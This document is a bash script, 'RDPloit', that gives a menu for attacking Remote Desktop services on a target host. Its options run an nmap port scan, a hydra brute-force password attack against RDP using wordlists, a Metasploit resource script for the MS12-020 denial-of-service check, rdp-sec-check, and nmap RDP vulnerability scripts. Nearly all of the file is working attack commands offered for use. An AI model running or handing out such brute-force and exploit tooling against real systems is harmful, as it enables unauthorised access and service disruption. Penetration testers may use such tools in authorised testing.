#!/bin/bash

# Project Name: RDPloit - 2021
# Coded By: @souravbaghz

#Colours
bold="\e[1m"
italic="\e[3m"
reset="\e[0m"
blink="\e[5m"
crayn="\e[36m"
yellow="\e[93m"
red="\e[31m"
green="\e[92m"
redbg="\e[41m"

trap ctrl_c INT

ctrl_c(){
   echo
   echo "CTRL_C by user"
   menu
}

target="$1"

#banner
banner(){
clear
echo -e "${red}                                    
 _____ ____  _____ _     _ _           
| __  |    \|  _  | |___|_| |_  
|    -|  |  |   __| | . | |  _|
|__|__|____/|__|  |_|___|_|_|  
                                       
 ${redbg}      ${yellow}by:@souravbaghz      ${reset}"
}

menu(){
banner
echo -e " [1] Check For Open Port"
echo -e " [2] Bruteforce Attack"
echo -e " [3] Check For DOS Attack"
echo -e " [4] Security Check"
echo -e " [5] Vulnerability Scan"
echo -e " [0] Exit"
read -p " [>] Choose: " option

if [[ $option = 1 || $option = 01 ]]
	then
	    echo -e "${red}+${reset}------------------------------------------------${red}+${reset}" 
        nmap -p 3389 $target
        echo .
		read -r -s -p $'Press enter to go menu...'
		menu

	elif [[ $option = 2 || $option = 02 ]]
	   then
	    echo -e "${red}+${reset}------------------------------------------------${red}+${reset}"
        hydra -V -f -L user.txt -P pwd.txt rdp://$target
        read -r -s -p $'Press enter to go menu...'
		menu
        
    elif [[ $option = 3 || $option = 03 ]]
       then
         echo -e "${red}+${reset}------------------------------------------------${red}+${reset}"
         echo "use auxiliary/scanner/rdp/ms12_020_check
         set rhosts" ""$target" 
         set lhost 127.0.0.1
         run" | tee rdpdos.rc
         #running msfconsole
         msfconsole -r rdpdos.rc
		 read -r -s -p $'Press enter to go menu...'
		 menu
		 
	elif [[ $option = 4 || $option = 04 ]]
       then
         echo -e "${red}+${reset}------------------------------------------------${red}+${reset}"
          ./src/rdp-sec-check.pl $target
		 read -r -s -p $'Press enter to go menu...'
		 menu
		 
	elif [[ $option = 5 || $option = 05 ]]
       then
         echo -e "${red}+${reset}------------------------------------------------${red}+${reset}"
         sudo nmap -p 3389 -sU -sS --script 'rdp-*' $target
		 read -r -s -p $'Press enter to go menu...'
		 menu	 	 
		 
	elif [[ $option = 0 || $option = 00 ]]
       then
         echo -e "[!]Exiting...${green}${reset}"
		 clear	 
         exit 1
         
        else
		echo "Invalid Option..."
		sleep 1
		clear
		menu
	fi	
}


menu
